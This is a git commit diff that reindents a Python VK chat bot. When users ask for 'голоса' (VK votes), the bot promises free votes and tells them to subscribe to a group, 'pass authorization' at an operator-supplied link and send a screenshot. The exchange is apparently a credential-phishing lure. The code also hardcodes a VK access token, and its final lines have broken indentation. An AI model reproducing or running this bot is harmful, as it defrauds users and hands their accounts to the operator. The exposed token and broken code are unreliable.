db15fa99bbb6176f4d67e60c20d8391b0267589c
Topo1us <65972332+Topo1us@users.noreply.github.com>
2020-06-02 20:24:21 +0300

    Update golosa.py

--- golosa.py
+++ golosa.py
@@ -5,7 +5,7 @@ from vk_api.longpoll import VkLongPoll, VkEventType
 x=123456
 os.system('clear')
 def lol(user_id,message):
-	vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':x})
+    vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':x})
 	
 token='c2e514f79dd6d1930905f9f32d103b20b6a177fc8906662818468804aaf2e528f69cf23528bce29fc80d5'
 vk=vk_api.VkApi(token=token)
@@ -13,14 +13,14 @@ longpoll=VkLongPoll(vk)
 link=input('введи ссылку: ')
 print('бот работает : )')
 for event in longpoll.listen():
-        if event.type==VkEventType.MESSAGE_NEW:
-                x+=1
-                if event.to_me:
-                        r=event.text
-                        print(event.user_id,r)
-                        if r=='Голоса' or r=='голоса':#если сообщение для бота голоса то
-                                lol(event.user_id,'Привет🙏\nДля получения голосов выполни 3 простых шага😏\n1:Подпишись на группу😇\n2:Пройди авторизацию'+link+'\n3:Отправь скрин!')
+    if event.type==VkEventType.MESSAGE_NEW:
+        x+=1
+        if event.to_me:
+            r=event.text
+            print(event.user_id,r)
+            if r=='Голоса' or r=='голоса':#если сообщение для бота голоса то
+                lol(event.user_id,'Привет🙏\nДля получения голосов выполни 3 простых шага😏\n1:Подпишись на группу😇\n2:Пройди авторизацию'+link+'\n3:Отправь скрин!')
                                 #иначе отправить это
-			if r=='q':
-				os.system('pkg install sl')
-				os.system('sl')
+            if r=='q':
+                os.system('pkg install sl')
+		os.system('sl')
